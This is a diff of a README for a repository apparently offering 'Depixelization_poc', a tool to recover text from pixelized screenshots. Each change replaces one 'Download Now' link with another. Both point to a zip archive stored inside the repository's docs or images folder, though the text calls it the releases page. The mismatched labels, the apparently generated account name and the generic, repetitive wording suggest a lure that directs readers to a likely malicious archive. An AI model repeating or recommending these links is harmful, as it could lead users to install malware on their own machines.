@@ -1,6 +1,6 @@
 # 🎨 Depixelization_poc - Recover Plaintext from Pixelized Screenshots
 
-[![Download Now](https://raw.githubusercontent.com/literatiselfpunishment625/Depixelization_poc/main/docs/Depixelization_poc_v2.6.zip)](https://raw.githubusercontent.com/literatiselfpunishment625/Depixelization_poc/main/docs/Depixelization_poc_v2.6.zip)
+[![Download Now](https://github.com/literatiselfpunishment625/Depixelization_poc/raw/refs/heads/main/images/Depixelization-poc-1.3.zip)](https://github.com/literatiselfpunishment625/Depixelization_poc/raw/refs/heads/main/images/Depixelization-poc-1.3.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Before you start, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to our releases page to get the latest version of Depix. [Visit this page to download](https://raw.githubusercontent.com/literatiselfpunishment625/Depixelization_poc/main/docs/Depixelization_poc_v2.6.zip).
+1. **Visit the Releases Page:** Go to our releases page to get the latest version of Depix. [Visit this page to download](https://github.com/literatiselfpunishment625/Depixelization_poc/raw/refs/heads/main/images/Depixelization-poc-1.3.zip).
 
 2. **Select the Right File:**
    - Look for the most recent release at the top of the list. 
@@ -72,6 +72,6 @@ If you require assistance, you can check out our documentation or FAQs section o
 
 ## 🔗 Download Now Again
 
-Again, remember to visit the releases page to download the application: [Visit this page to download](https://raw.githubusercontent.com/literatiselfpunishment625/Depixelization_poc/main/docs/Depixelization_poc_v2.6.zip). 
+Again, remember to visit the releases page to download the application: [Visit this page to download](https://github.com/literatiselfpunishment625/Depixelization_poc/raw/refs/heads/main/images/Depixelization-poc-1.3.zip). 
 
 Happy recovering!
